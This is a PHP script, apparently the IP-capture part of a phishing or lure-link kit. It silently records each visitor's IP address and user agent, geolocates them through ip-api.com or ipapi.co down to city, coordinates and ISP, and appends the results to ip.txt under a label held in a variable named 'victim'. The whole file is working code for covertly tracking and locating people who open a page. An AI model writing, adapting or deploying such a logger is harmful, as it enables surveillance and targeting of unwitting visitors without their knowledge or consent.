<?php

// Универсальная функция для получения IP адреса
function getClientIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

// Функция для получения геолокации по IP адресу
function getGeoLocation($ip) {
    // Пропускаем локальные IP адреса
    if ($ip === '127.0.0.1' || $ip === '::1' || strpos($ip, '192.168.') === 0 || strpos($ip, '10.') === 0) {
        return array(
            'country' => 'Local',
            'city' => 'Local',
            'region' => 'Local',
            'lat' => '0',
            'lon' => '0',
            'isp' => 'Local Network'
        );
    }
    
    // Используем ip-api.com (бесплатный, до 45 запросов в минуту)
    $url = "http://ip-api.com/json/$ip?fields=status,message,country,regionName,city,lat,lon,isp,timezone";
    $response = @file_get_contents($url);
    
    if ($response === false) {
        // Если не получилось, пробуем другой сервис
        $url2 = "https://ipapi.co/$ip/json/";
        $response = @file_get_contents($url2);
        if ($response !== false) {
            $data = json_decode($response, true);
            if (isset($data['error']) === false) {
                return array(
                    'country' => $data['country_name'] ?? 'Unknown',
                    'city' => $data['city'] ?? 'Unknown',
                    'region' => $data['region'] ?? 'Unknown',
                    'lat' => $data['latitude'] ?? '0',
                    'lon' => $data['longitude'] ?? '0',
                    'isp' => $data['org'] ?? 'Unknown'
                );
            }
        }
        return array(
            'country' => 'Unknown',
            'city' => 'Unknown',
            'region' => 'Unknown',
            'lat' => '0',
            'lon' => '0',
            'isp' => 'Unknown'
        );
    }
    
    $data = json_decode($response, true);
    if (isset($data['status']) && $data['status'] === 'success') {
        return array(
            'country' => $data['country'] ?? 'Unknown',
            'city' => $data['city'] ?? 'Unknown',
            'region' => $data['regionName'] ?? 'Unknown',
            'lat' => $data['lat'] ?? '0',
            'lon' => $data['lon'] ?? '0',
            'isp' => $data['isp'] ?? 'Unknown',
            'timezone' => $data['timezone'] ?? 'Unknown'
        );
    }
    
    return array(
        'country' => 'Unknown',
        'city' => 'Unknown',
        'region' => 'Unknown',
        'lat' => '0',
        'lon' => '0',
        'isp' => 'Unknown'
    );
}

// Получаем IP адрес
$ipaddress = getClientIP();
$useragent = " User-Agent: ";
$browser = $_SERVER['HTTP_USER_AGENT'];

// Получаем геолокацию
$geo = getGeoLocation($ipaddress);

$file = 'ip.txt';
$victim = "IP: ";
$fp = fopen($file, 'a');

fwrite($fp, $victim);
fwrite($fp, $ipaddress . "\r\n");
fwrite($fp, $useragent);
fwrite($fp, $browser . "\r\n");
fwrite($fp, " Country: " . $geo['country'] . "\r\n");
fwrite($fp, " Region: " . $geo['region'] . "\r\n");
fwrite($fp, " City: " . $geo['city'] . "\r\n");
fwrite($fp, " Latitude: " . $geo['lat'] . "\r\n");
fwrite($fp, " Longitude: " . $geo['lon'] . "\r\n");
fwrite($fp, " ISP: " . $geo['isp'] . "\r\n");
if (isset($geo['timezone'])) {
    fwrite($fp, " Timezone: " . $geo['timezone'] . "\r\n");
}

fclose($fp);
